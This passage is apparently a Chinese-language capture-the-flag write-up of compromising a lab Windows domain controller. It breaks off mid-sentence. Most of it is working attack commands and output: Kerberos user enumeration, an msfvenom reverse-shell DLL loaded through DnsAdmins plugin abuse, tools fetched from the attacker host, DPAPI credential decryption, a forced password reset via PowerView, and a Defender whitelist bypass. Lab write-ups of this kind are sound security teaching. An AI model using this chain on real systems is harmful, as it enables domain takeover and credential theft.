\u670d\u52a1\u679a\u4e3e\n\n\u5728\u786e\u8ba4\u76ee\u6807\u4e3a\u57df\u63a7\u540e\uff0c\u6211\u4eec\u9488\u5bf9\u5176\u6838\u5fc3\u670d\u52a1\u8fdb\u884c\u66f4\u5177\u9488\u5bf9\u6027\u7684\u4fe1\u606f\u6536\u96c6\u3002\n\n*   **DNS SRV \u8bb0\u5f55\u67e5\u8be2**\n    \u901a\u8fc7 `dig` \u67e5\u8be2 SRV \u8bb0\u5f55\uff0c\u53ef\u4ee5\u7cbe\u786e\u5730\u786e\u8ba4\u63d0\u4f9b\u5173\u952e\u670d\u52a1\u7684\u670d\u52a1\u5668\u4e3b\u673a\u540d\u3002\n    ```bash\n    \u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n    \u2514\u2500$ dig @192.168.205.149 -t SRV _kerberos._tcp.bicker.com\n    ...\n    ;; ANSWER SECTION:\n    _kerberos._tcp.bicker.com. 600  IN      SRV     0 100 88 dc.bicker.com.\n    ...\n    ```\n    \u67e5\u8be2\u7ed3\u679c\u8fdb\u4e00\u6b65\u8bc1\u5b9e\u4e86 Kerberos (KDC), LDAP, \u548c\u5168\u5c40\u7f16\u5f55 (GC) \u670d\u52a1\u5747\u7531 `dc.bicker.com` (`192.168.205.149`) \u63d0\u4f9b\u3002\n\n*   **LDAP \u533f\u540d\u7ed1\u5b9a\u63a2\u6d4b**\n    \u5c1d\u8bd5\u5728\u672a\u63d0\u4f9b\u4efb\u4f55\u51ed\u636e\u7684\u60c5\u51b5\u4e0b\u67e5\u8be2 LDAP\uff0c\u63a2\u6d4b\u662f\u5426\u5b58\u5728\u5141\u8bb8\u533f\u540d\u679a\u4e3e\u7684\u5e38\u89c1\u914d\u7f6e\u9519\u8bef\u3002\n    ```bash\n    \u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n    \u2514\u2500$ ldapsearch -x -H ldap://192.168.205.149 -b 'DC=bicker,DC=com'\n    # extended LDIF\n    ...\n    # search result\n    search: 2\n    result: 1 Operations error\n    text: 000004DC: LdapErr: DSID-0C090A58, comment: In order to perform this opera\n     tion a successful bind must be completed on the connection., data 0, v4f7c\n    \n    # numResponses: 1\n    ```\n    \u670d\u52a1\u5668\u62d2\u7edd\u4e86\u533f\u540d\u67e5\u8be2\uff0c\u8868\u660e\u5176 LDAP \u670d\u52a1\u8fdb\u884c\u4e86\u57fa\u672c\u7684\u5b89\u5168\u52a0\u56fa\u3002\n\n*   **Kerberos \u7528\u6237\u540d\u679a\u4e3e**\n    \u5229\u7528 Kerberos \u534f\u8bae\u5728\u5904\u7406\u7528\u6237\u5b58\u5728\u4e0e\u5426\u65f6\u8fd4\u56de\u4e0d\u540c\u9519\u8bef\u4ee3\u7801\u7684\u7279\u6027\uff0c\u53ef\u4ee5\u4f7f\u7528 `kerbrute` \u7b49\u5de5\u5177\u9ad8\u6548\u5730\u9a8c\u8bc1\u7528\u6237\u540d\u5217\u8868\u3002\n    ```bash\n    \u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n    \u2514\u2500$ kerbrute userenum --dc 192.168.205.149 -d bicker.com /usr/share/seclists/Usernames/cirt-default-usernames.txt \n    ...\n    2025/08/16 09:46:41 >  [+] VALID USERNAME:       ADMINISTRATOR@bicker.com\n    2025/08/16 09:46:41 >  [+] VALID USERNAME:       Administrator@bicker.com\n    2025/08/16 09:46:41 >  [+] VALID USERNAME:       Guest@bicker.com\n    ...\n    ```\n    \u8be5\u6b65\u9aa4\u6210\u529f\u9a8c\u8bc1\u4e86 `administrator`, `guest` \u7b49\u591a\u4e2a\u5185\u7f6e\u8d26\u6237\u7684\u5b58\u5728\uff0c\u4e3a\u540e\u7eed\u7684\u51ed\u636e\u653b\u51fb\u63d0\u4f9b\u4e86\u76ee\u6807\u3002\n\n*   **AS-REP Roasting \u653b\u51fb\u5c1d\u8bd5**\n    \u8fd9\u662f\u4e00\u79cd\u9488\u5bf9\u7981\u7528\u4e86 Kerberos \u9884\u8eab\u4efd\u9a8c\u8bc1\u7684\u7528\u6237\u7684\u653b\u51fb\u3002\u5982\u679c\u5b58\u5728\u6b64\u7c7b\u7528\u6237\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4e3a\u5176\u8bf7\u6c42 TGT\uff0c\u5e76\u79bb\u7ebf\u7206\u7834\u5176\u4e2d\u5305\u542b\u7684\u52a0\u5bc6\u6570\u636e\u4ee5\u83b7\u53d6\u7528\u6237\u5bc6\u7801\u3002\n    ```bash\n    \u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n    \u2514\u2500$ python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py bicker.com/ -usersfile user -format hashcat -outputfile hash\n    Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies \n    \n    [-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set\n    [-] User guest doesn't have UF_DONT_REQUIRE_PREAUTH set\n    ```\n    \u5c1d\u8bd5\u5931\u8d25\uff0c\u8868\u660e\u76ee\u6807\u57df\u4e2d\u7684\u7528\u6237\u5747\u5f00\u542f\u4e86\u9884\u8eab\u4efd\u9a8c\u8bc1\uff0c\u6b64\u653b\u51fb\u8def\u5f84\u65e0\u6548\u3002\n\n# **\u4e8c\u3001\u521d\u6b65\u7a81\u7834**\n\n## 1. SMB \u533f\u540d\u5171\u4eab\u63a2\u6d4b\n\n\u5c3d\u7ba1 LDAP \u533f\u540d\u7ed1\u5b9a\u88ab\u7981\u7528\uff0c\u4f46 SMB \u670d\u52a1\u53ef\u80fd\u5b58\u5728\u72ec\u7acb\u7684\u8bbf\u95ee\u63a7\u5236\u914d\u7f6e\u3002\u6211\u4eec\u68c0\u67e5\u662f\u5426\u5b58\u5728\u65e0\u9700\u51ed\u636e\u5373\u53ef\u8bbf\u95ee\u7684\u5171\u4eab\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ smbclient -L //192.168.205.149 -N   \n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      \u8fdc\u7a0b\u7ba1\u7406\n        C$              Disk      \u9ed8\u8ba4\u5171\u4eab\n        IPC$            IPC       \u8fdc\u7a0b IPC\n        NETLOGON        Disk      Logon server share \n        puppy           Disk      \n        SYSVOL          Disk      Logon server share \n...\n```\n\u53d1\u73b0\u4e86\u4e00\u4e2a\u540d\u4e3a `puppy` \u7684\u533f\u540d\u53ef\u8bfb\u5171\u4eab\uff0c\u8fd9\u662f\u4e00\u4e2a\u6f5c\u5728\u7684\u4fe1\u606f\u6cc4\u9732\u70b9\u3002\u6211\u4eec\u8fde\u63a5\u8be5\u5171\u4eab\u5e76\u4e0b\u8f7d\u5176\u4e2d\u7684\u6587\u4ef6\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ smbclient //192.168.205.149/puppy -N\nTry 'help' to get a list of possible commands.\nsmb: \\> ls\n  .                                   D        0  Fri Aug 15 00:06:51 2025\n  ..                                DHS        0  Fri Aug 15 05:20:46 2025\n  puppy.jpg                           A    57634  Fri Aug 15 00:06:51 2025\n\n                12923135 blocks of size 4096. 9313382 blocks available\nsmb: \\> get puppy.jpg\ngetting file \\puppy.jpg of size 57634 as puppy.jpg (3752.2 KiloBytes/sec) (average 3752.2 KiloBytes/sec)\nsmb: \\> exit\n```\n\n## 2. \u5f00\u6e90\u60c5\u62a5 (OSINT) \u83b7\u53d6\u51ed\u636e\n\n\u5bf9\u4e0b\u8f7d\u7684 `puppy.jpg` \u6587\u4ef6\u8fdb\u884c\u5206\u6790\uff0c\u5bfb\u627e\u53ef\u80fd\u5b58\u5728\u7684\u7ebf\u7d22\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ strings puppy.jpg|head -n 10        \nJFIF\nExif\nbilibili\nGoogle\nuid=3546958956333518\n0220\n , #&')*)\n-0-(0%()(\n((((((((((((((((((((((((((((((((((((((((((((((((((\na2#q\n```\n\u6587\u4ef6\u5b57\u7b26\u4e32\u4e2d\u5305\u542b\u4e00\u4e2a Bilibili UID (`3546958956333518`)\u3002\u901a\u8fc7\u5728 Bilibili \u7f51\u7ad9\u4e0a\u641c\u7d22\u6b64 UID\uff0c\u6211\u4eec\u627e\u5230\u4e86\u4e00\u4e2a\u7528\u6237\u53d1\u5e03\u7684\u52a8\u6001\uff0c\u5176\u4e2d\u76f4\u63a5\u6cc4\u9732\u4e86\u4e00\u7ec4\u51ed\u636e\uff1a\n**`tindalos:Th3C@ll0fCtHu1hu!`**\n\n## 3. \u83b7\u5f97\u521d\u59cb Shell\n\n\u5229\u7528\u8fd9\u7ec4\u610f\u5916\u83b7\u5f97\u7684\u51ed\u636e\uff0c\u6211\u4eec\u5c1d\u8bd5\u901a\u8fc7\u4e4b\u524d\u53d1\u73b0\u7684 WinRM \u670d\u52a1 (\u7aef\u53e3 5985) \u767b\u5f55\u76ee\u6807\u4e3b\u673a\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ evil-winrm -i 192.168.205.149 -u 'tindalos' -p 'Th3C@ll0fCtHu1hu!'\n                                        \nEvil-WinRM shell v3.7\n...                                     \nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\tindalos\\Documents>\n```\n\u8fde\u63a5\u6210\u529f\uff01\u6211\u4eec\u83b7\u5f97\u4e86\u4e00\u4e2a\u5c5e\u4e8e\u57df\u7528\u6237 `bicker\\tindalos` \u7684\u4ea4\u4e92\u5f0f PowerShell Shell\uff0c\u5b8c\u6210\u4e86\u521d\u6b65\u7a81\u7834\u3002\n\n# **\u4e09\u3001\u6743\u9650\u63d0\u5347**\n\n## 1. \u5185\u90e8\u4fe1\u606f\u6536\u96c6\u4e0e\u6001\u52bf\u611f\u77e5\n\n\u7acb\u8db3\u4e8e\u5f53\u524d Shell\uff0c\u9996\u8981\u4efb\u52a1\u662f\u5168\u9762\u4e86\u89e3 `tindalos` \u7528\u6237\u7684\u6743\u9650\u548c\u5728\u57df\u4e2d\u7684\u89d2\u8272\u3002\n\n```powershell\n*Evil-WinRM* PS C:\\Users\\tindalos\\Documents> whoami /all\n\n\u7528\u6237\u4fe1\u606f\n----------------\n\u7528\u6237\u540d          SID\n=============== ============================================\nbicker\\tindalos S-1-5-21-298176814-2846777796-698167141-1103\n\n\u7ec4\u4fe1\u606f\n-----------------\n\u7ec4\u540d                                        \u7c7b\u578b   SID                                          \u5c5e\u6027\n=========================================== ====== ============================================ ======================================\n...\nBICKER\\DnsAdmins                            \u522b\u540d   S-1-5-21-298176814-2846777796-698167141-1101 \u5fc5\u9700\u7684\u7ec4, \u542f\u7528\u4e8e\u9ed8\u8ba4, \u542f\u7528\u4e8e\u7ec4, \u672c\u5730\u7ec4\n...\n```\n**\u5173\u952e\u53d1\u73b0\uff1a** `whoami /all` \u7684\u8f93\u51fa\u663e\u793a\uff0c\u7528\u6237 `tindalos` \u96b6\u5c5e\u4e8e `DnsAdmins` \u7ec4\u3002\u8fd9\u662f\u4e00\u4e2a\u6781\u5ea6\u5371\u9669\u7684\u5185\u7f6e\u7ec4\uff0c\u5176\u6210\u5458\u901a\u5e38\u53ef\u4ee5\u901a\u8fc7\u6ee5\u7528 DNS \u670d\u52a1\u914d\u7f6e\u6765\u5b9e\u73b0\u6743\u9650\u63d0\u5347\u81f3\u57df\u63a7\u7684 `SYSTEM`\u3002\n\n## 2. \u63d0\u6743\u8def\u5f84\u5206\u6790\uff1a\u4e24\u6761\u9053\u8def\n\n\u57fa\u4e8e `DnsAdmins` \u7684\u6743\u9650\uff0c\u6211\u4eec\u6709\u4e24\u6761\u63d0\u6743\u8def\u5f84\u53ef\u9009\uff1a\n\n1.  **\u6377\u5f84\uff08\u9ad8\u566a\u97f3\uff09\uff1a** \u76f4\u63a5\u914d\u7f6e\u6076\u610f DLL\uff0c\u7136\u540e\u901a\u8fc7\u91cd\u542f\u6574\u4e2a\u9776\u673a\u6765\u89e6\u53d1\u6267\u884c\u3002\u6b64\u65b9\u6cd5\u7b80\u5355\u7c97\u66b4\uff0c\u4f46\u52a8\u9759\u5de8\u5927\uff0c\u5728\u771f\u5b9e\u73af\u5883\u4e2d\u5e94\u6781\u529b\u907f\u514d\u3002\n2.  **\u9884\u671f\u89e3\uff08\u4f4e\u566a\u97f3\uff09\uff1a** \u6df1\u5165\u6316\u6398\u4fe1\u606f\uff0c\u5bfb\u627e\u4e00\u4e2a\u62e5\u6709\u91cd\u542f DNS \u670d\u52a1\u6743\u9650\u7684\u7528\u6237\uff0c\u901a\u8fc7\u4e00\u7cfb\u5217\u6a2a\u5411\u79fb\u52a8\uff0c\u6700\u7ec8\u5728\u4e0d\u91cd\u542f\u670d\u52a1\u5668\u7684\u60c5\u51b5\u4e0b\u89e6\u53d1\u6f0f\u6d1e\u3002\n\n## 3. \u63d0\u6743\u8def\u5f84\u4e00\uff1a\u6377\u5f84\uff08\u91cd\u542f\u9776\u673a\uff09\n\n\u6b64\u8def\u5f84\u5229\u7528 `DnsAdmins` \u6743\u9650\u8bbe\u7f6e\u597d\u540e\u95e8\uff0c\u7136\u540e\u901a\u8fc7\u91cd\u542f\u9776\u673a\u8fd9\u4e00\u201c\u6b6a\u95e8\u90aa\u9053\u201d\u6765\u5b8c\u7f8e\u8df3\u5173\u3002\n\n*   **\u751f\u6210\u6076\u610f DLL**\n    \u4f7f\u7528 `msfvenom` \u521b\u5efa\u4e00\u4e2a\u53cd\u5411\u8fde\u63a5 Shell \u7684 DLL\u3002\n    ```bash\n    \u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n    \u2514\u2500$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.205.128 LPORT=8888 -f dll -o dns.dll\n    [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n    [-] No arch selected, selecting arch: x64 from the payload\n    No encoder specified, outputting raw payload\n    Payload size: 460 bytes\n    Final size of dll file: 9216 bytes\n    Saved as: dns.dll\n    ```\n*   **\u4e0a\u4f20\u5e76\u914d\u7f6e DLL**\n    \u5728 `tindalos` \u7684 Shell \u4e2d\uff0c\u4ece Kali \u4e0b\u8f7d\u6b64 DLL\uff0c\u5e76\u4f7f\u7528 `dnscmd.exe` \u5c06\u5176\u6ce8\u518c\u4e3a `ServerLevelPluginDll`\u3002\n    ```powershell\n    *Evil-WinRM* PS C:\\Users\\tindalos\\Documents> Invoke-WebRequest -Uri 'http://192.168.205.128/dns.dll' -OutFile 'C:\\Users\\tindalos\\Documents\\dns.dll'\n    \n    *Evil-WinRM* PS C:\\Users\\tindalos\\Documents> dnscmd.exe localhost /config /serverlevelplugindll C:\\Users\\tindalos\\Documents\\dns.dll\n    \n    \u6ce8\u518c\u5c5e\u6027 serverlevelplugindll \u6210\u529f\u91cd\u7f6e\u3002\n    \u547d\u4ee4\u6210\u529f\u5b8c\u6210\u3002\n    ```\n*   **\u76d1\u542c\u5e76\uff08\u6a21\u62df\uff09\u91cd\u542f**\n    \u5728 Kali \u4e0a\u5f00\u542f\u76d1\u542c\u3002\u6b64\u65f6\uff0c\u901a\u8fc7\u865a\u62df\u5316\u7ba1\u7406\u5e73\u53f0\u91cd\u542f\u76ee\u6807\u670d\u52a1\u5668\uff0c\u5373\u53ef\u89e6\u53d1 DLL \u52a0\u8f7d\u3002\n    \n    ```bash\n    \u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n    \u2514\u2500$ nc -lvnp 8888                                                 \n    listening on [any] 8888 ...\n    connect to [192.168.205.128] from (UNKNOWN) [192.168.205.149] 62282\n    Microsoft Windows [\ufffd\u6c7e 10.0.20348.169]\n    (c) Microsoft Corporation\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u0228\ufffd\ufffd\ufffd\ufffd\n    \n    C:\\Windows\\system32>whoami\n    nt authority\\system\n    ```\n    \u6b64\u8def\u5f84\u867d\u7136\u53ef\u884c\uff0c\u4f46\u7ed5\u8fc7\u4e86\u9776\u673a\u8bbe\u8ba1\u7684\u6838\u5fc3\u6311\u6218\u3002\n\n## 4. \u63d0\u6743\u8def\u5f84\u4e8c\uff1a\u9884\u671f\u89e3\uff08\u7cbe\u51c6\u6743\u9650\u5229\u7528\uff09\n\n\u8fd9\u6761\u8def\u5f84\u8003\u9a8c\u7684\u662f\u5728\u53d7\u9650\u73af\u5883\u4e0b\u7684\u6df1\u5ea6\u4fe1\u606f\u6316\u6398\u548c\u6a2a\u5411\u79fb\u52a8\u80fd\u529b\uff0c\u662f\u66f4\u4e3a\u4e13\u4e1a\u548c\u9690\u853d\u7684\u624b\u6cd5\u3002\n\n### 4.1. \u672c\u5730\u51ed\u636e\u6316\u6398\n\n*   **\u679a\u4e3e\u57df\u7528\u6237**\n    \u4e3a\u89c4\u5212\u6a2a\u5411\u79fb\u52a8\u8def\u5f84\uff0c\u6211\u4eec\u679a\u4e3e\u57df\u5185\u7684\u5176\u4ed6\u7528\u6237\u53ca\u5176\u7ec4\u5173\u7cfb\u3002\n    ```powershell\n    *Evil-WinRM* PS C:\\Users\\tindalos\\Documents> net user jianyin /domain\n    ...\n    \u5168\u5c40\u7ec4\u6210\u5458             *Domain Users         *DNSRestarters\n    *Evil-WinRM* PS C:\\Users\\tindalos\\Documents> net user lihua /domain\n    ...\n    \u5168\u5c40\u7ec4\u6210\u5458             *Domain Users         *AccountModifier\n    ```\n    \u53d1\u73b0\u4e86\u4e24\u4e2a\u5173\u952e\u7684\u81ea\u5b9a\u4e49\u7ec4\uff1a`DNSRestarters` \u548c `AccountModifier`\u3002\n*   **\u7ed5\u8fc7 Windows Defender**\n    \u5c1d\u8bd5\u6267\u884c`Seatbelt.exe`\u88ab Defender \u62e6\u622a\u3002\u901a\u8fc7\u63a2\u7d22\u53d1\u73b0 `C:\\wirteTEMP` \u662f\u4e00\u4e2a\u767d\u540d\u5355\u76ee\u5f55\uff0c\u540e\u7eed\u5de5\u5177\u5747\u5728\u6b64\u76ee\u5f55\u4e0b\u6267\u884c\u3002\n*   **\u5229\u7528 DPAPI \u89e3\u5bc6\u51ed\u636e**\n    **\u6280\u672f\u80cc\u666f**\uff1aWindows \u4f7f\u7528\u6570\u636e\u4fdd\u62a4 API (DPAPI) \u6765\u52a0\u5bc6\u5b58\u50a8\u5728\u7528\u6237\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684\u654f\u611f\u4fe1\u606f\u3002\u7531\u4e8e\u6211\u4eec\u5df2\u77e5 `tindalos` \u7684\u660e\u6587\u5bc6\u7801\uff0c\u53ef\u4ee5\u89e3\u5bc6\u5176 DPAPI \u4e3b\u5bc6\u94a5\uff0c\u8fdb\u800c\u89e3\u5bc6\u7531\u5b83\u4fdd\u62a4\u7684\u5176\u4ed6\u51ed\u636e\u3002\n    ```powershell\n    *Evil-WinRM* PS C:\\wirteTEMP> Invoke-WebRequest -Uri 'http://192.168.205.128/SharpDPAPI.exe' -OutFile 'C:\\wirteTEMP\\SharpDPAPI.exe'\n    *Evil-WinRM* PS C:\\wirteTEMP> ./SharpDPAPI.exe credentials /unprotect /credfile:'C:\\Users\\tindalos\\AppData\\Roaming\\Microsoft\\Credentials\\A2E4656BCBABFD9279E090E8482A7141' /sid:S-1-5-21-298176814-2846777796-698167141-1103 /password:'Th3C@ll0fCtHu1hu!'\n    ...\n      CredFile           : A2E4656BCBABFD9279E090E8482A7141\n        ...\n        UserName         : lihua\n        Credential       : hello%2633\n    ...\n    ```\n    \u6267\u884c\u6210\u529f\uff01\u6211\u4eec\u4ece `tindalos` \u7684\u672c\u5730\u5b58\u50a8\u4e2d\uff0c\u89e3\u5bc6\u51fa\u4e86\u53e6\u4e00\u4f4d\u7528\u6237 `lihua` \u7684\u660e\u6587\u5bc6\u7801\uff1a`hello%2633`\u3002\n\n### 4.2. \u6a2a\u5411\u79fb\u52a8\u4e0e ACL \u6df1\u5ea6\u679a\u4e3e\n\n\u83b7\u5f97\u4e86 `lihua` \u7684\u51ed\u636e\uff0c\u6211\u4eec\u7acb\u5373\u6a2a\u5411\u79fb\u52a8\u5230\u8be5\u7528\u6237\u7684\u4f1a\u8bdd\u4e2d\uff0c\u5e76\u6df1\u5165\u6316\u6398\u5176\u6240\u5c5e\u7684 `AccountModifier` \u7ec4\u5230\u5e95\u62e5\u6709\u4f55\u79cd\u6743\u9650\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ evil-winrm -i 192.168.205.149 -u 'lihua' -p 'hello%2633'\n...\n*Evil-WinRM* PS C:\\Users\\lihua\\Documents> whoami\nbicker\\lihua\n```\n\u4e3a\u4e86\u7cbe\u786e\u679a\u4e3e Active Directory \u7684\u8bbf\u95ee\u63a7\u5236\u5217\u8868 (ACL)\uff0c\u6211\u4eec\u4e0a\u4f20\u5e76\u52a0\u8f7d\u5f3a\u5927\u7684 `PowerView.ps1` \u811a\u672c\u3002\n\n```powershell\n*Evil-WinRM* PS C:\\wirteTEMP> Invoke-WebRequest -Uri 'http://192.168.205.128/PowerView.ps1' -OutFile 'C:\\wirteTEMP\\pv.ps1'\n\n*Evil-WinRM* PS C:\\wirteTEMP> . .\\pv.ps1\n```\n\u52a0\u8f7d\u540e\uff0c\u6211\u4eec\u4f7f\u7528 PowerView \u67e5\u8be2 `AccountModifier` \u7ec4\u5177\u4f53\u5bf9 `jianyin` \u7528\u6237\u62e5\u6709\u54ea\u4e9b\u6743\u9650\u3002\n\n```powershell\n*Evil-WinRM* PS C:\\wirteTEMP> Find-InterestingDomainAcl -ResolveGUIDs | Where-Object { $_.ObjectDN -match 'jianyin' } | Format-List *\n\nObjectDN                : CN=jianyin,CN=Users,DC=bicker,DC=com\nAceQualifier            : AccessAllowed\nActiveDirectoryRights   : ExtendedRight\nObjectAceType           : User-Force-Change-Password\nAceFlags                : None\nAceType                 : AccessAllowedObject\nInheritanceFlags        : None\nSecurityIdentifier      : S-1-5-21-298176814-2846777796-698167141-2107\nIdentityReferenceName   : AccountModifier\nIdentityReferenceDomain : bicker.com\nIdentityReferenceDN     : CN=AccountModifier,CN=Users,DC=bicker,DC=com\nIdentityReferenceClass  : group\n```\n**\u5206\u6790\u7ed3\u679c**\uff1a\u8f93\u51fa\u6781\u4e3a\u7cbe\u786e\u5730\u544a\u8bc9\u6211\u4eec\uff0c`AccountModifier` \u7ec4\u5bf9 `jianyin` \u7528\u6237\u5bf9\u8c61\u62e5\u6709\u7684\u5e76\u975e\u901a\u7528\u5199\u5165\u6743\uff0c\u800c\u662f\u4e00\u9879\u7279\u5b9a\u7684**\u6269\u5c55\u6743\u9650 (Extended Right)**\uff1a`User-Force-Change-Password`\u3002\n\n### 4.3. \u7cbe\u51c6\u5229\u7528 ACL \u63a7\u5236\u7528\u6237\n\n\u8981\u5229\u7528\u8fd9\u4e00\u7279\u5b9a\u7684\u59d4\u6d3e\u6743\u9650\uff0c\u5fc5\u987b\u4f7f\u7528\u80fd\u591f\u8c03\u7528\u76f8\u5e94 ADSI \u63a5\u53e3\u7684\u5de5\u5177\u3002PowerView \u7684 `Set-DomainUserPassword` \u51fd\u6570\u6b63\u662f\u4e3a\u6b64\u8bbe\u8ba1\u7684\u3002\n\n*   **\u5904\u7406 `SecureString`**\n    **\u6280\u672f\u80cc\u666f**\uff1a\u4e3a\u5b89\u5168\u8d77\u89c1\uff0c\u73b0\u4ee3 PowerShell cmdlet \u901a\u5e38\u8981\u6c42\u5bc6\u7801\u53c2\u6570\u4e3a `SecureString` \u7c7b\u578b\uff0c\u8fd9\u662f\u4e00\u79cd\u5728\u5185\u5b58\u4e2d\u52a0\u5bc6\u5b58\u50a8\u7684\u5b57\u7b26\u4e32\u5bf9\u8c61\u3002\u6211\u4eec\u9700\u8981\u5148\u5c06\u660e\u6587\u5bc6\u7801\u8fdb\u884c\u8f6c\u6362\u3002\n    ```powershell\n    *Evil-WinRM* PS C:\\wirteTEMP> $SecurePassword = ConvertTo-SecureString 'P@ssword123!' -AsPlainText -Force\n    ```\n*   **\u91cd\u7f6e\u5bc6\u7801**\n    \u73b0\u5728\uff0c\u6211\u4eec\u53ef\u4ee5\u8c03\u7528\u51fd\u6570\uff0c\u5e76\u4f20\u5165\u8f6c\u6362\u540e\u7684 `SecureString` \u5bf9\u8c61\u3002\n    ```powershell\n    *Evil-WinRM* PS C:\\wirteTEMP> Set-DomainUserPassword -Identity jianyin -AccountPassword $SecurePassword -Verbose\n    Verbose: [Set-DomainUserPassword] Attempting to set the password for user 'jianyin'\n    Verbose: [Set-DomainUserPassword] Password for user 'jianyin' successfully reset\n    ```\n    \u547d\u4ee4\u6210\u529f\u6267\u884c\uff0c\u6211\u4eec\u5df2\u5b8c\u5168\u63a7\u5236 `jianyin` \u8d26\u6237\u3002\n\n### 4.4. \u89e6\u53d1\u6f0f\u6d1e\uff0c\u83b7\u53d6 SYSTEM \u6743\u9650\n\n\u81f3\u6b64\uff0c\u6240\u6709\u62fc\u56fe\u90fd\u5df2\u96c6\u9f50\uff1a`tindalos` \u653e\u7f6e\u4e86\u540e\u95e8\uff0c`lihua` \u5e2e\u52a9\u6211\u4eec\u63a7\u5236\u4e86 `jianyin`\uff0c\u800c `jianyin` \u6b63\u662f\u90a3\u4e2a\u62e5\u6709\u201c\u5f15\u7206\u201d\u6743\u9650\u7684\u4eba\u3002\n\n*   **\u4f7f\u7528\u65b0\u51ed\u636e\u767b\u5f55**\n    \u6211\u4eec\u73b0\u5728\u4ee5 `jianyin` \u7684\u8eab\u4efd\u767b\u5f55\uff0c\u4ed6\u7684\u5bc6\u7801\u5df2\u88ab\u6211\u4eec\u91cd\u7f6e\u4e3a `P@ssword123!`\u3002\n    ```bash\n    \u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n    \u2514\u2500$ evil-winrm -i 192.168.205.149 -u 'jianyin' -p 'P@ssword123!'\n    ...\n    *Evil-WinRM* PS C:\\Users\\jianyin\\Documents> whoami\n    bicker\\jianyin\n    ```\n*   **\u51c6\u5907\u76d1\u542c\u5e76\u91cd\u542f\u670d\u52a1**\n    \u5728 Kali \u4e0a\u5f00\u542f Netcat \u76d1\u542c\uff0c\u51c6\u5907\u63a5\u6536\u53cd\u5f39 Shell\u3002\u7136\u540e\u5728 `jianyin` \u7684\u4f1a\u8bdd\u4e2d\uff0c\u6267\u884c\u91cd\u542f DNS \u670d\u52a1\u7684\u547d\u4ee4\u3002\n    ```bash\n    # \u5728 Kali \u7ec8\u7aef\n    \u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n    \u2514\u2500$ nc -lvnp 8888\n    listening on [any] 8888 ...\n    ```\n    ```powershell\n    # \u5728 jianyin \u7684 evil-winrm shell \u4e2d\n    *Evil-WinRM* PS C:\\Users\\jianyin\\Documents> Restart-Service DNS\n    ```\n*   **\u63a5\u6536 Shell\uff0c\u63d0\u6743\u6210\u529f**\n    DNS \u670d\u52a1\u91cd\u542f\u65f6\uff0c\u52a0\u8f7d\u4e86\u6211\u4eec\u9884\u5148\u8bbe\u7f6e\u7684\u6076\u610f DLL\u3002Kali \u7684\u76d1\u542c\u7a97\u53e3\u6210\u529f\u63a5\u6536\u5230\u8fde\u63a5\uff0c\u6211\u4eec\u83b7\u5f97\u4e86\u4e00\u4e2a `NT AUTHORITY\\SYSTEM` \u6743\u9650\u7684 shell\u3002\n    ```bash\n    \u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n    \u2514\u2500$ nc -lvnp 8888\n    listening on [any] 8888 ...\n    connect to [192.168.205.128] from (UNKNOWN) [192.168.205.149] 58463\n    Microsoft Windows [\ufffd\u6c7e 10.0.20348.169]\n    (c) Microsoft Corporation\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u0228\ufffd\ufffd\ufffd\ufffd\n    \n    C:\\Windows\\system32>whoami\n    nt authority\\system\n    ```\n\n# **\u56db\u3001\u593a\u53d6\u51ed\u8bc1**\n\n\u83b7\u5f97\u57df\u63a7\u7684\u6700\u9ad8\u6743\u9650\u540e\uff0c\u6211\u4eec\u76f4\u63a5\u8fdb\u5165\u7ba1\u7406\u5458\u684c\u9762\uff0c\u67e5\u627e\u5e76\u8bfb\u53d6\u6700\u7ec8\u7684 flag\u3002\n\n```\nC:\\Windows\\system32>cd C:\\Users\\Administrator\\Desktop\\\n\nC:\\Users\\Administrator\\Desktop>dir\n \ufffd\ufffd\ufffd\ufffd\ufffd\ufffd C \ufffd\u0435\u013e\ufffd\u00fb\ufffd\u0431\ufffd\u01e9\ufffd\ufffd\n \ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u043a\ufffd\ufffd\ufffd D05C-A317\n\n C:\\Users\\Administrator\\Desktop \ufffd\ufffd\u013f\u00bc\n\n2025/08/15  18:36    <DIR>          .\n2025/08/15  16:59    <DIR>          ..\n2025/08/15  17:06             2,288 Microsoft Edge.lnk\n2025/08/15  18:37                54 root.txt\n               2 \ufffd\ufffd\ufffd\u013c\ufffd          2,342 \ufffd\u05bd\ufffd\n               2 \ufffd\ufffd\u013f\u00bc 38,144,806,912 \ufffd\ufffd\ufffd\ufffd\ufffd\u05bd\ufffd\n\nC:\\Users\\Administrator\\Desktop>type root.txt\nroot{7c1e4b8a2d6f3b9c5e0a}\n```\n\u6210\u529f\u83b7\u53d6 root 